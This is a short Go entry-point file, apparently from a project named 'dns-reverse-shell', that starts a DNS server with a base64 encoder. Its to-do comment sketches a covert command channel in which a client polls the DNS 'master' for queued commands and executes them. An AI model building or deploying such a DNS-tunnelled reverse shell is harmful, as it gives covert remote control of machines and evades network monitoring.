package main

import (
	"dns-reverse-shell/main/encoder"
	"dns-reverse-shell/main/protocol"
)

func main() {
	dnsServer := protocol.NewDnsServer("8090", encoder.NewBase64Encoder())
	dnsServer.Serve()
}

/*
todo revert master/slave:
	poll every x second to "dns server(master)". master has a command "stack". when polled retrieve command from stack
	execute in client. when stack ist empty, return some sort of idle

todo implement msg splitter:
	current problem: header size too big, reicv fails with header overflow
*/
